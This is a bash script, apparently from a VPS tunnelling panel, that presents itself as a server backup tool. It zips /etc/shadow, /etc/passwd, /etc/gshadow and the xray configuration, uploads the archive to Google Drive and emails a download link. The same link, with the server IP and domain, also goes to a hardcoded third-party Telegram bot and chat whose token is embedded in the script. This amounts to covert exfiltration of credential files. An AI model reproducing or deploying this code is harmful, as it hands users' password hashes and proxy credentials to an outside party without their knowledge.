#!/bin/bash
# SL
# ==========================================
# Color
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================
AKUN="AKUN SSH"
TIMES="10"
CHATID="-923595763"
KEY="6364118071:AAGM4r2YuCwlJng9l7Gh_DdAKKDmP3U-0Ik"
URL="https://api.telegram.org/bot$KEY/sendMessage"
hariini=`date -d "0 days" +"%Y-%m-%d"`
clear
# Getting
clear
IP=$(wget -qO- ipinfo.io/ip);
date=$(date +"%Y-%m-%d")
clear
email=$(cat /home/email)
if [[ "$email" = "" ]]; then
echo "Masukkan Email Untuk Menerima Backup"
read -rp "Email : " -e email
cat <<EOF>>/home/email
$email
EOF
fi
clear
figlet "Backup"
echo "Mohon Menunggu , Proses Backup sedang berlangsung !!"
rm -rf /root/backup
mkdir /root/backup
cp /etc/passwd backup/
cp /etc/group backup/
cp /etc/shadow backup/
cp /etc/gshadow backup/
cp -r /etc/xray backup/xray
cp -r /root/nsdomain backup/nsdomain
cp -r /etc/slowdns backup/slowdns
cp -r /home/vps/public_html backup/public_html
cd /root
zip -r $IP-$date.zip backup > /dev/null 2>&1
rclone copy /root/$IP-$date.zip dr:backup/
url=$(rclone link dr:backup/$IP-$date.zip)
id=(`echo $url | grep '^https' | cut -d'=' -f2`)
link="https://drive.google.com/u/4/uc?id=${id}&export=download"
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
==================================
" | mail -s "Backup Data" $email
rm -rf /root/backup
rm -r /root/$IP-$date.zip
clear
TEXT="
<code>◇━━━━━━━━━━━━━━◇</code>
<b>   ⚠️BACKUP NOTIF⚠️</b>
<b>     Detail Backup VPS</b>
<code>◇━━━━━━━━━━━━━━◇</code>
<b>IP VPS  :</b> <code>${IP} </code>
<b>DOMAIN :</b> <code>$(cat /etc/xray/domain)</code>
<b>Tanggal : $date</b>
<code>◇━━━━━━━━━━━━━━◇</code>
<b>Link Backup   :</b> $link
<code>◇━━━━━━━━━━━━━━◇</code>
<code>Silahkan copy Link dan restore di VPS baru</code>
<code>BY BOT : @WokszXD</code>
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo ""
clear
echo -e "
Detail Backup 
==================================
IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date
==================================
"
echo "Silahkan cek Kotak Masuk $email"
